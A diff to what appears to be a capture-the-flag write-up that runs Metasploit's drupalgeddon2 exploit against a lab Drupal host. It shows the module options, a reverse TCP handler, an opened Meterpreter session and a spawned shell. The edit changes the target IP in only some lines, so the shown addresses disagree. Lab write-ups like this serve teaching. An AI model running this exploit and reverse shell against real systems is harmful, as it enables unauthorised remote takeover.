@@ -34,7 +34,7 @@ https://www.rapid7.com/db/modules/exploit/unix/webapp/drupal_drupalgeddon2/
 
 use exploit/unix/webapp/drupal_drupalgeddon2 this exploit and set options like 
 	
-	msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 10.10.10.233
+	msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 10.10.10.223
 	RHOSTS => 10.10.10.233
 	msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set TARGETURI /?q=user
 	TARGETURI => /?q=user
@@ -44,7 +44,7 @@ use exploit/unix/webapp/drupal_drupalgeddon2 this exploit and set options like
 	
 	[*] Started reverse TCP handler on 10.10.14.16:4444 
 	[*] Sending stage (39282 bytes) to 10.10.10.233
-	[*] Meterpreter session 1 opened (10.10.14.16:4444 -> 10.10.10.233:56262) at 2021-04-28 13:14:25 +0530
+	[*] Meterpreter session 1 opened (10.10.14.16:4444 -> 10.10.10.223:56262) at 2021-04-28 13:14:25 +0530
 
 	meterpreter > shell	
 	Process 6897 created.
